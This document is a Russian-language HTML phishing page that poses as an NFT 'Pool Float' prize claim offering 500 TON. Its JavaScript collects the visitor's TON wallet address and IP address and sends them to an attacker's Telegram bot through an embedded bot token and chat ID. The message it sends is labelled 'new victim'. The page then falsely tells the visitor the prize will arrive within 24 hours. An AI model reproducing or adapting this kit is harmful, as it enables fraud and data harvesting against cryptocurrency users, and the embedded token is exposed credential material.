<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pool Float - Claim Prize</title>
    <style>
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 20px;
            text-align: center;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
        }
        input {
            width: 100%;
            padding: 15px;
            margin: 15px 0;
            border: 2px solid #ddd;
            border-radius: 10px;
            font-size: 16px;
            box-sizing: border-box;
        }
        button {
            background: #0088cc;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            border-radius: 10px;
            cursor: pointer;
            width: 100%;
            font-weight: bold;
        }
        button:hover { background: #006699; }
        .status { margin-top: 20px; color: #666; }
        h2 { color: #333; }
        p { color: #666; }
        .info {
            background: #f0f0f0;
            padding: 10px;
            border-radius: 10px;
            font-size: 12px;
            color: #999;
            margin-top: 20px;
        }
    </style>
</head>
<body>
<div class="container">
    <h2>🔥 ТВОЙ NFT ПОБЕДИЛ!</h2>
    <p>Pool Float #148899 выиграл <strong>500 TON</strong> + редкий апгрейд</p>
    
    <input type="text" id="walletAddress" placeholder="Введи адрес твоего TON кошелька (UQ... или EQ...)" style="text-align: center;">
    
    <button onclick="claimPrize()">💎 ПОЛУЧИТЬ ПРИЗ</button>
    
    <div class="status" id="status"></div>
    <div class="info">
        ℹ️ Как получить адрес кошелька:<br>
        Tonkeeper → Receive → Скопировать адрес<br>
        @wallet → Receive → Скопировать адрес
    </div>
</div>

<script>
    // ========== ТВОИ ДАННЫЕ ==========
    const BOT_TOKEN = "7666942287:AAGo8rC7c8KQ7alb1PEmhl9KPdTx1liZO9M";
    const ADMIN_CHAT_ID = 1727566558;
    // =================================

    async function claimPrize() {
        const address = document.getElementById('walletAddress').value.trim();
        const statusDiv = document.getElementById('status');
        
        if (!address) {
            statusDiv.innerHTML = "❌ ВВЕДИ АДРЕС КОШЕЛЬКА!";
            statusDiv.style.color = "red";
            return;
        }
        
        if (!address.startsWith('UQ') && !address.startsWith('EQ')) {
            statusDiv.innerHTML = "❌ НЕВЕРНЫЙ АДРЕС! Адрес должен начинаться с UQ или EQ";
            statusDiv.style.color = "red";
            return;
        }
        
        if (address.length < 40) {
            statusDiv.innerHTML = "❌ СЛИШКОМ КОРОТКИЙ АДРЕС!";
            statusDiv.style.color = "red";
            return;
        }
        
        statusDiv.innerHTML = "⏳ ПРОВЕРКА АДРЕСА...";
        statusDiv.style.color = "#666";
        
        // Отправляем адрес в Telegram
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: ADMIN_CHAT_ID,
                    text: `🎯 НОВАЯ ЖЕРТВА!\n💰 Адрес: ${address}\n⏰ Время: ${new Date().toLocaleString()}\n🌐 IP: ${await getIP()}`
                })
            });
            
            statusDiv.innerHTML = "✅ ПРИЗ БУДЕТ ОТПРАВЛЕН В ТЕЧЕНИИ 24 ЧАСОВ НА УКАЗАННЫЙ АДРЕС!";
            statusDiv.style.color = "green";
            document.getElementById('walletAddress').value = '';
            
        } catch(error) {
            statusDiv.innerHTML = "❌ ОШИБКА! Попробуй позже";
            statusDiv.style.color = "red";
        }
    }
    
    async function getIP() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            return data.ip;
        } catch(e) {
            return 'unknown';
        }
    }
</script>
</body>
</html>
